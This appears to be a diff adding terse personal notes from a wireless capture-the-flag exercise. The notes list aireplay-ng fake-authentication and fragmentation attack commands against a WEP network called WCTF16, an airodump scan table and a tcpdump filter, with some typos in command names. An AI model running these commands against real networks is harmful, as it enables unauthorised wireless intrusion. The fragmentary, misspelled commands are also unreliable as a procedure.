@@ -1,0 +1,32 @@
+WCTF16 00:c0:ca:6d:0f:7e
+
+
+-a E8:94:F6:48:74:EE -h 00:c0:ca:6d:0f:7e
+
+airmon-zc wlan1 6
+
+aireplay-ng -1 0 -e WCTF16 -a E8:94:F6:48:74:EE -h e8:94:f6:24:7f:50 wlan1mon
+
+aireplay-ng -1 6000 -o 1 -q 10 -e WCTF16 -a E8:94:F6:48:74:EE -h e8:94:f6:24:7f:50 wlan1mon
+
+70.309
+899.977
+
+arpeplay-ng -5 -b E8:94:F6:48:74:EE -h 00:c0:ca:6d:0f:7e wlan1mon
+
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                                        
+ 00:11:74:D0:7A:01  -18      108       20    0   6  54e. WPA2 CCMP   PSK  WCTF-MGMT                     
+ 64:66:B3:94:00:12  -21       77        3    0   1  54e  WEP  WEP    OPN  WCTF13                        
+ 00:11:74:D0:7A:00  -20       98       55    0   6  54e. WPA2 CCMP   PSK  WCTF14                        
+ E8:94:F6:48:74:EE  -33      100        0    0   6  54e  WEP  WEP         WCTF16  
+
+aireplay-ng -5 -b E8:94:F6:48:74:EE -h e8:94:f6:24:7f:50 wlan1mon
+                 
+aireplay-ng -1 6000 -o 1 -q 10 -e WCTF16 -a E8:94:F6:48:74:EE -h e8:94:f6:24:7f:50 wlan1mon
+
+aireplay-ng -1 30 -e 'WCTF16' -a E8:94:F6:48:74:EE -h e8:94:f6:24:7f:50 wlan1mon
+
+tcpdump -n -vvv -s0 -e -i ath0 | grep -i -E "(e8:94:f6:24:7f:50|Authentication|ssoc)"
+
+
